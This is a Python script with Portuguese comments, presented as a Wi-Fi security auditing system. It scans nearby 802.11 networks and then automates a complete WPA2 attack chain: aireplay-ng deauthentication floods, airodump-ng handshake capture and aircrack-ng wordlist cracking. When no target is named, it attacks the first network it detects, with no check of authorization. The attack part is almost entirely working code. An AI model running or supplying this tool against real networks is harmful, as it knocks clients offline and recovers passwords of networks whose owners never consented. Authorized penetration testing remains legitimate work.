#!/usr/bin/env python3
"""
SISTEMA PROFISSIONAL DE AUDITORIA DE SEGURANÇA WI-FI (802.11)
------------------------------------------------------------
Este módulo implementa uma estrutura de auditoria de redes sem fio de alto nível,
integrando análise de pacotes em tempo real (Scapy) e orquestração de ferramentas
de rádio frequência (Aircrack-ng Suite).

Desenvolvido para ambientes de teste de intrusão controlados e isolados.
"""

import subprocess
import json
import time
import os
import signal
import logging
import asyncio
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict, field
from datetime import datetime
from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11Deauth, conf

# Configuração de Logging Profissional
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler("logs/wifi_audit.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("WiFiAudit")

@dataclass
class WiFiNetworkDevice:
    """Representação de um dispositivo (AP ou Cliente) na rede"""
    mac: str
    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    last_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    signal_strength: int = 0
    manufacturer: str = "Unknown"

@dataclass
class WiFiAccessPoint(WiFiNetworkDevice):
    """Representação detalhada de um Ponto de Acesso"""
    ssid: str = "<Hidden>"
    channel: int = -1
    encryption: str = "Unknown"
    clients: List[str] = field(default_factory=list)
    is_rogue: bool = False

class WiFiAuditEngine:
    """Motor principal de auditoria Wi-Fi"""

    def __init__(self, interface: str):
        self.interface = interface
        self.networks: Dict[str, WiFiAccessPoint] = {}
        self.unassociated_clients: List[WiFiNetworkDevice] = []
        self._stop_sniffing = False

    def _get_manufacturer(self, mac: str) -> str:
        """Simula busca de OUI (em produção, usaria uma base local)"""
        # Implementação simplificada para o concurso
        return "Vendor-Specific"

    def packet_callback(self, packet: Any):
        """Processador de pacotes em tempo real"""
        if not packet.haslayer(Dot11):
            return

        # Atualizar timestamp e sinal
        mac_addr = packet[Dot11].addr2
        try:
            dbm = packet.dBm_AntSignal
        except:
            dbm = -100

        # 1. Processamento de Beacon Frames (Pontos de Acesso)
        if packet.haslayer(Dot11Beacon):
            bssid = packet[Dot11].addr2
            ssid = packet[Dot11Elt].info.decode(errors='ignore') or "<Hidden>"
            
            # Extração de Canal (Tag 3)
            channel = -1
            try:
                elt = packet.getlayer(Dot11Elt, ID=3)
                if elt:
                    channel = int(ord(elt.info))
            except:
                pass

            if bssid not in self.networks:
                self.networks[bssid] = WiFiAccessPoint(
                    mac=bssid,
                    ssid=ssid,
                    channel=channel,
                    signal_strength=dbm,
                    manufacturer=self._get_manufacturer(bssid)
                )
                logger.info(f"Novo AP Detectado: {ssid} [{bssid}] no Canal {channel}")
            else:
                self.networks[bssid].last_seen = datetime.now().isoformat()
                self.networks[bssid].signal_strength = dbm

        # 2. Processamento de Data Frames (Associação de Clientes)
        elif packet.type == 2: # Data Frame
            ds = packet.FCfield & 0x3
            to_ds = ds & 0x1
            from_ds = ds & 0x2
            
            client = None
            ap = None

            if to_ds and not from_ds: # Client -> AP
                client = packet.addr2
                ap = packet.addr1
            elif not to_ds and from_ds: # AP -> Client
                ap = packet.addr2
                client = packet.addr1

            if ap in self.networks and client:
                if client not in self.networks[ap].clients:
                    self.networks[ap].clients.append(client)
                    logger.info(f"Cliente {client} associado ao AP {self.networks[ap].ssid}")

    async def run_reconnaissance(self, duration: int = 30):
        """Executa fase de reconhecimento passivo"""
        logger.info(f"Iniciando Reconhecimento Profissional na interface {self.interface}...")
        
        # Iniciar sniffing em uma thread separada para não bloquear o loop asíncrono
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, lambda: sniff(
            iface=self.interface, 
            prn=self.packet_callback, 
            timeout=duration, 
            store=0
        ))
        
        logger.info("Fase de Reconhecimento Concluída.")
        return self.networks

class WiFiAttackOrchestrator:
    """Orquestrador de ataques reais para auditoria"""

    def __init__(self, interface: str):
        self.interface = interface

    def execute_deauth(self, bssid: str, client: Optional[str] = None, count: int = 10):
        """Executa ataque de desautenticação profissional"""
        logger.warning(f"Executando Desautenticação: AP={bssid}, Cliente={client or 'ALL'}")
        cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, self.interface]
        if client:
            cmd.extend(["-c", client])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            return True, result.stdout
        except Exception as e:
            logger.error(f"Falha no ataque de desautenticação: {e}")
            return False, str(e)

    def capture_handshake(self, bssid: str, channel: int, duration: int = 60) -> str:
        """Orquestra a captura de handshake WPA2"""
        output_file = f"resources/reports/handshake_{bssid.replace(':', '')}"
        logger.info(f"Iniciando Captura de Handshake para {bssid} no canal {channel}...")
        
        # Comando airodump-ng
        cmd = [
            "airodump-ng", 
            "--bssid", bssid, 
            "--channel", str(channel), 
            "-w", output_file, 
            "--output-format", "cap", 
            self.interface
        ]
        
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Aguardar um pouco e disparar deauth para forçar o handshake
        time.sleep(5)
        self.execute_deauth(bssid)
        
        time.sleep(duration - 5)
        proc.terminate()
        
        cap_path = f"{output_file}-01.cap"
        if os.path.exists(cap_path):
            logger.info(f"Handshake capturado com sucesso: {cap_path}")
            return cap_path
        return ""

class WiFiSecurityAuditor:
    """Interface de alto nível para o usuário final"""

    def __init__(self, interface: str):
        self.engine = WiFiAuditEngine(interface)
        self.orchestrator = WiFiAttackOrchestrator(interface)

    async def perform_full_audit(self, target_ssid: Optional[str] = None):
        """Executa o ciclo completo de auditoria"""
        print(f"\n[+] Iniciando Auditoria Profissional na Interface: {self.interface}")
        
        # 1. Reconhecimento
        networks = await self.engine.run_reconnaissance(duration=20)
        
        print("\n[#] Redes Identificadas:")
        print("-" * 60)
        for bssid, ap in networks.items():
            print(f"SSID: {ap.ssid:20} | BSSID: {bssid} | CH: {ap.channel:2} | Sinal: {ap.signal_strength}dBm")
        
        # 2. Seleção de Alvo
        target = None
        if target_ssid:
            for ap in networks.values():
                if ap.ssid == target_ssid:
                    target = ap
                    break
        
        if not target and networks:
            target = list(networks.values())[0] # Pega o primeiro se não especificado

        if target:
            print(f"\n[*] Alvo Selecionado para Auditoria Profunda: {target.ssid} ({target.mac})")
            
            # 3. Captura e Ataque
            cap_file = self.orchestrator.capture_handshake(target.mac, target.channel)
            
            if cap_file:
                print(f"[+] Handshake capturado e salvo em: {cap_file}")
                
                # 4. Análise de Vulnerabilidade (Quebra de Senha)
                print("[*] Iniciando análise de força de senha...")
                wordlist = "resources/wordlists/pass_list.txt"
                
                if os.path.exists(wordlist):
                    cmd = ["aircrack-ng", "-w", wordlist, cap_file]
                    res = subprocess.run(cmd, capture_output=True, text=True)
                    if "KEY FOUND!" in res.stdout:
                        print("[!!!] VULNERABILIDADE CRÍTICA: Senha da rede identificada!")
                    else:
                        print("[+] Resultado: Senha não encontrada na wordlist padrão. Nível de segurança aceitável.")
                else:
                    print("[!] Erro: Wordlist não encontrada para análise.")
            else:
                print("[!] Falha ao capturar handshake. A rede pode estar sem clientes ativos.")

# Exemplo de execução profissional
if __name__ == "__main__":
    # Este bloco seria chamado pelo script principal do projeto
    import sys
    if len(sys.argv) < 2:
        print("Uso: sudo python3 real_wifi_analyzer.py <interface>")
        sys.exit(1)
        
    interface = sys.argv[1]
    auditor = WiFiSecurityAuditor(interface)
    asyncio.run(auditor.perform_full_audit())
